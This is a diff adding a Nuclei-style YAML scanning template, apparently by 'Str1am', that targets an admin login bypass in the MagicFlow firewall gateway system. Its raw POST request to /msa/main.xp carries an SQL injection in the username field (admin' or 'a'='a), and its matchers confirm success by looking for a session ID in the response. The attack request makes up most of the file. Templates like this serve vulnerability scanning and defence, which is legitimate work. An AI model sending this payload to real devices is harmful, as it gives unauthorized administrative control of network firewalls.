@@ -1,0 +1,32 @@
+id: MagicFlow-sqli
+info:
+  author: Str1am
+  name: "MagicFlow\u6709\u7EBF\u65E0\u7EBF\u4E00\u4F53\u5316\u9632\u706B\u5899\u7F51\
+    \u5173\u7CFB\u7EDF\u7BA1\u7406\u5458\u7ED5\u8FC7\u767B\u5F55"
+  severity: high
+  tags: MagicFlow,sqli
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - sessionid
+    - errtype
+  matchers-condition: and
+  raw:
+  - 'POST /msa/main.xp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    X-Requested-With: XMLHttpRequest
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    Fun=msaAdminLogon&username=admin''%20or%20''a''%3D''a&password=a
+
+    '
